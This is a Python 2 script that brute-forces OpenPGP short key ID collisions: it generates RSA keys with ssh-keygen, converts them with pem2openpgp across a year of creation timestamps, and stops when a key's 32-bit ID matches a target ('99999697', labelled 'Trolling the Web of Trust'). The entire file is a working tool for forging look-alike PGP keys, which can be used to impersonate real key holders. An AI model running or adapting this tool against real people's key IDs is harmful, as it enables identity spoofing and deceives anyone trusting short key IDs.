#!/usr/bin/env python

import sys, os, subprocess
from time import time
cwd = sys.path[0]

class TrollWot_BruteForceKeyID:
    def __init__(self, keyid, userid):
        self.start_time = int(time())
        self.keyid = keyid
        self.userid = userid
        self.rsa_count = 0
        self.tries = 0

        if not self.check_paths():
            return

        timestamp_now = int(time())
        timestamp_last_year = timestamp_now - 60*60*24*365

        self.found = False
        while not self.found:
            self.gen_rsa()
            print 'Starting brute force'
            for timestamp in range(timestamp_last_year, timestamp_now)[::-1]:
                fingerprint = self.gen_openpgp(timestamp)
                if self.found:
                    break

    def check_paths(self):
        # make sure there's an ssh key dir
        self.ssh_homedir = '{0}/bruteforce_keyid_data/{1}/ssh'.format(cwd, self.start_time)
        self.gpg_homedir = '{0}/bruteforce_keyid_data/{1}/gpg'.format(cwd, self.start_time)
        if not os.path.exists(self.ssh_homedir): 
            try:
                os.makedirs(self.ssh_homedir, 0700)
            except Exception, e:
                print "Error making ssh homedir {0}: {1}".format(self.ssh_homedir, e)
                return False
        if not os.path.exists(self.gpg_homedir): 
            try:
                os.makedirs(self.gpg_homedir, 0700)
            except Exception, e:
                print "Error making gpg homedir {0}: {1}".format(self.gpg_homedir, e)
                return False
        return True

    def gen_rsa(self):
        # generating RSA key
        self.rsa_count += 1
        print "Generating a new RSA key {0}/{1}".format(self.ssh_homedir, self.rsa_count)
        subprocess.Popen('ssh-keygen -f {0}/{1} -P "" -q'.format(self.ssh_homedir, self.rsa_count), shell=True).wait()

    def gen_openpgp(self, creation_timestamp):
        # convert it to an openpgp key
        os.environ['PEM2OPENPGP_KEY_TIMESTAMP'] = str(creation_timestamp)
        p = subprocess.Popen('{0}/lib/monkeysphere-0.35/src/pem2openpgp "{1}" < {2}/{3} | gpg --homedir {4} --import'.format(cwd, self.userid, self.ssh_homedir, self.rsa_count, self.gpg_homedir), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        p.wait()
        for line in p.stderr.readlines():
            if 'secret key imported' in line:
                keyid = line.split()[2].split(':')[0]
                if keyid == self.keyid:
                    print '\nGenerated collision'
                    subprocess.Popen(['gpg', '--homedir', self.gpg_homedir, '--fingerprint', '--list-keys', keyid])
                    self.found = True
                else:
                    #if self.tries % 1000 == 0:
                    sys.stdout.write('.')
                    sys.stdout.flush()
        self.tries += 1

if __name__ == '__main__':
    TrollWot_BruteForceKeyID("99999697", "Trolling the Web of Trust")

